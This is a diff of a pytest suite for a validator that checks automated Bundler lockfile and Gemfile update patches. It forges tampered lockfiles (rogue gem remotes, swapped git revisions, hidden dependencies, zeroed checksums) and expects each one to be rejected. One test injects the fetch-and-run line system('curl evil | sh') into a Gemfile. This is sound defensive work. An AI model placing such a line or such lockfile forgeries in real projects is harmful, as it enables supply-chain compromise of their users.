@@ -100,10 +100,10 @@ def test_good_patch_validates():
 
 @pytest.mark.parametrize("mutate,needle", [
     (lambda p: p.update(after_lock=p["after_lock"].replace("https://rubygems.org/", "https://evil.example/")), "GEM remote"),
-    (lambda p: p.update(after_lock=p["after_lock"].replace("revision: abc123", "revision: evil999")), "GIT section changed"),
-    (lambda p: p.update(after_lock=p["after_lock"].replace("PLATFORMS\n  ruby", "PLATFORMS\n  ruby\n  java")), "PLATFORMS section changed"),
+    (lambda p: p.update(after_lock=p["after_lock"].replace("revision: abc123", "revision: evil999")), "source list"),
+    (lambda p: p.update(after_lock=p["after_lock"].replace("PLATFORMS\n  ruby", "PLATFORMS\n  ruby\n  java")), "platforms changed"),
     (lambda p: p.update(after_lock=p["after_lock"] + "\nPATH\n  remote: .\n  specs:\n    y (1.0.0)\n"), "PATH"),
-    (lambda p: p.update(after_lock=p["after_lock"].replace("  jekyll (~> 4.3.4)", "  jekyll (~> 4.3.4)\n  evil (>= 0)")), "DEPENDENCIES changed outside"),
+    (lambda p: p.update(after_lock=p["after_lock"].replace("  jekyll (~> 4.3.4)", "  jekyll (~> 4.3.4)\n  evil (>= 0)")), "DEPENDENCIES entry changed outside"),
     (lambda p: p.update(after_lock=p["after_lock"].replace("    i18n (1.14.7)", "    i18n (1.15.0)\n    newdep (1.0.0)")), "outside the matrix"),
     (lambda p: p.update(after_gemfile=p["after_gemfile"] + "system('curl evil | sh')\n"), "Gemfile change outside the matrix"),
     (lambda p: p.update(after_gemfile=p["after_gemfile"].replace("= 1.17.4", "= 9.9.9")), "not pinned to the matrix version"),
@@ -602,7 +602,7 @@ def test_invisible_gem_with_letter_version_and_hidden_dependency_is_rejected():
 
 def test_unchanged_gem_dependency_lines_must_be_identical():
     p = with_after_lock(a=("    jekyll-obsidian-wikilinks (2.1.1)\n", "    jekyll-obsidian-wikilinks (2.1.1)\n      rexml (>= 0)\n"))
-    assert_rejected(p, "outside the matrix gems")
+    assert_rejected(p, "outside the matrix update")
 
 
 def test_updated_gem_must_land_on_the_matrix_version_even_if_summary_matches():
@@ -685,3 +685,126 @@ def test_fetch_and_build_always_write_a_manifest_and_build_skips_it(tmp_path, ca
     capsys.readouterr()
     assert al.main(["--phase", "build", "--in", str(out), "--patches", str(tmp_path / "p")]) == 0
     assert (tmp_path / "p" / "MANIFEST.txt").exists() and "meta.json" not in capsys.readouterr().out
+
+
+# ------------------------------------------------------------------ round 4: structural comparison (real keke.li lock)
+FIX = os.path.join(os.path.dirname(__file__), "fixtures")
+KEKE_REPO = "BrightSoftwares/keke.li"
+KEKE_ALLOWED = {KEKE_REPO.lower()}
+
+
+def _fx(name):
+    with open(os.path.join(FIX, name), encoding="utf-8") as fh:
+        return fh.read()
+
+
+def keke_patch(edit=None):
+    """A realistic patch for the real keke.li lock (ffi, rexml below the matrix): bump the spec and checksum lines, add the
+    `= version` DEPENDENCIES pins bundler writes, regenerate the Gemfile and summary. `edit(lock)` forges the after lock."""
+    gf, lk = _fx("keke.li.Gemfile"), _fx("keke.li.before.Gemfile.lock")
+    before = al.parse_lock(lk)
+    upd = al.plan(before, M)["update"]
+    out = lk
+    for g in upd:
+        out = out.replace(f"    {g} ({before[g]})\n", f"    {g} ({M['gems'][g]})\n")
+        out = out.replace(f"  {g} ({before[g]}) sha256=", f"  {g} ({M['gems'][g]}) sha256=")
+    deps = [f"  {g} (= {M['gems'][g]})" for g in upd]
+    head, rest = out.split("\nDEPENDENCIES\n", 1)
+    block, tail = rest.split("\n\n", 1)
+    out = head + "\nDEPENDENCIES\n" + "\n".join(sorted(block.split("\n") + deps)) + "\n\n" + tail
+    if edit:
+        edited = edit(out)
+        assert edited != out, "forgery edit did not apply"
+        out = edited
+    return {"repo": KEKE_REPO, "branch": "main", "before_gemfile": gf, "before_lock": lk,
+            "after_gemfile": al.pin_gemfile(gf, {g: M["gems"][g] for g in upd}), "after_lock": out,
+            "summary": ", ".join(f"{g} {before[g]}->{M['gems'][g]}" for g in upd), "ahead": ""}
+
+
+def keke_problems(p):
+    return al.patch_problems(p, M, KEKE_ALLOWED)
+
+
+def test_structural_validator_accepts_the_legitimate_keke_patch_and_a_noop():
+    assert keke_problems(keke_patch()) == []
+    on_matrix = keke_patch()["after_lock"]
+    assert al.lock_problems(on_matrix, on_matrix, M)[0] == []
+
+
+@pytest.mark.parametrize("name", ["forged-variantB-keke.lock", "forged2c.lock"])
+def test_reviewer_forged_locks_with_a_glued_git_section_are_rejected(name):
+    # a GIT block with a different revision glued into the GEM chunk (no blank line): Bundler keeps the forged revision
+    forged = _fx(name)
+    assert "revision: 49f699f4c17e4736dd98c43dc03852b0ad5c3c35" in _fx("keke.li.before.Gemfile.lock")
+    assert forged.count("  revision: ") == 2 and forged != _fx("keke.li.before.Gemfile.lock")
+    p = keke_patch(lambda legit: forged)
+    problems = keke_problems(p)
+    assert problems, "forged lock accepted"
+    assert any("source list" in x or "not preceded by an empty line" in x or "headers changed" in x for x in problems), problems
+
+
+def test_section_header_without_a_preceding_empty_line_is_rejected_and_header_order_is_pinned():
+    p = keke_patch(lambda l: l.replace("\n\nPLATFORMS\n", "\nPLATFORMS\n", 1))
+    assert any("not preceded by an empty line" in x for x in keke_problems(p))
+    swapped = keke_patch(lambda l: l.replace("\n\nCHECKSUMS\n", "\n\nPLATFORMS\n  ruby\n\nCHECKSUMS\n", 1))
+    assert any("headers changed" in x for x in keke_problems(swapped))
+
+
+def test_duplicate_lower_version_spec_next_to_the_real_one_is_rejected():
+    p = keke_patch(lambda l: l.replace("    webrick (1.9.2)\n", "    webrick (1.7.0)\n    webrick (1.9.2)\n", 1))
+    assert keke_problems(p)
+
+
+def test_git_plugin_reassigned_to_rubygems_is_rejected():
+    p = keke_patch(lambda l: l.replace("    webrick (1.9.2)\n", "    jekyll-obsidian-wikilinks (2.1.1)\n    webrick (1.9.2)\n", 1))
+    problems = keke_problems(p)
+    # Bundler's parser silently keeps the first of two identical name/version specs, so the text gate must catch it
+    assert any("spec list length" in x for x in problems), problems
+
+
+def test_dependency_line_added_under_a_matrix_gem_is_rejected():
+    p = keke_patch(lambda l: l.replace("    jekyll (4.3.4)\n", "    jekyll (4.3.4)\n      evil (>= 0)\n", 1))
+    assert keke_problems(p)
+    q = keke_patch(lambda l: l.replace("    ffi (1.17.4)\n", "    ffi (1.17.4)\n      evil (>= 0)\n", 1))  # bumped gem too
+    assert any("not in the lock" in x or "outside" in x for x in keke_problems(q))
+
+
+def test_checksums_and_bundled_with_cannot_be_dropped_or_rewritten():
+    gone = keke_patch(lambda l: l[: l.index("\nCHECKSUMS\n")] + "\n" + l[l.index("\nBUNDLED WITH\n") :].lstrip("\n").join(["", ""]))
+    assert keke_problems(gone)
+    zeros = keke_patch(lambda l: l.replace("  webrick (1.9.2) sha256=beb4a15f", "  webrick (1.9.2) sha256=00000000", 1))
+    assert any("CHECKSUMS" in x for x in keke_problems(zeros))
+    bw = keke_patch(lambda l: l.replace("BUNDLED WITH\n  4.0.10", "BUNDLED WITH\n  2.3.0", 1))
+    assert any("BUNDLED WITH changed" in x for x in keke_problems(bw))
+    ruby = keke_patch(lambda l: l.replace("BUNDLED WITH\n  4.0.10", "RUBY VERSION\n  ruby 2.0.0\n\nBUNDLED WITH\n  4.0.10", 1))
+    assert keke_problems(ruby)
+
+
+def test_bundled_with_allowlist_in_the_matrix_is_honoured():
+    m = dict(M, allow_bundler="4.0.18")
+    p = keke_patch(lambda l: l.replace("BUNDLED WITH\n  4.0.10", "BUNDLED WITH\n  4.0.18", 1))
+    assert al.patch_problems(p, m, KEKE_ALLOWED) == []
+    assert keke_problems(p)  # without the allowlist the same change is refused
+
+
+def test_validator_fails_closed_without_ruby_or_on_timeout():
+    def no_ruby(*a, **k):
+        raise FileNotFoundError("ruby")
+
+    def slow(*a, **k):
+        raise al.subprocess.TimeoutExpired("ruby", 10)
+
+    for runner, word in ((no_ruby, "not available"), (slow, "timed out")):
+        problems = al.structure_problems(LOCK, LOCK, M, runner=runner)
+        assert problems and word in problems[0]
+
+
+def test_error_messages_echoing_lock_lines_are_capped():
+    p = keke_patch(lambda l: l.replace("  remote: https://rubygems.org/\n", "  remote: https://evil.example/" + "a" * 100_000 + "\n", 1))
+    problems = keke_problems(p)
+    assert problems and all(len(x) < 400 for x in problems), max(len(x) for x in problems)
+
+
+def test_exactly_one_remote_per_source_section():
+    two = LOCK.replace("  remote: https://rubygems.org/\n", "  remote: https://rubygems.org/\n  remote: https://rubygems.org/\n", 1)
+    assert any("exactly one required" in x for x in al.sources_problems(two, M))
